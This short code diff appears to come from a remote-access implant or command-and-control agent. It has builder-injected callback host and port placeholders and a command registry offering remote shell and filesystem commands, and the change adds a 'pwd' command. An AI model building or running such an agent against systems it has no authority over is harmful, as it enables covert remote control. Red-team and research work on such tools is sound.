@@ -15,6 +15,9 @@ from commands import shell as cmd_shell
 from commands import exit as cmd_exit
 from commands import ls as cmd_ls
 from commands import cd as cmd_cd
+from commands import pwd as cmd_pwd
+
+
 # --- Injected by builder via string substitution ---
 CALLBACK_HOST   = "REPLACE_CALLBACK_HOST"
 CALLBACK_PORT   = int("REPLACE_CALLBACK_PORT")
@@ -104,7 +107,8 @@ COMMANDS = {
     "shell": cmd_shell.execute,
     "exit":  cmd_exit.execute,
     "ls":    cmd_ls.execute,
-    "cd":    cmd_cd.execute
+    "cd":    cmd_cd.execute,
+    "pwd":   cmd_pwd.execute,
 }
 
 # Handles a single task by looking up the command in the registry and executing it
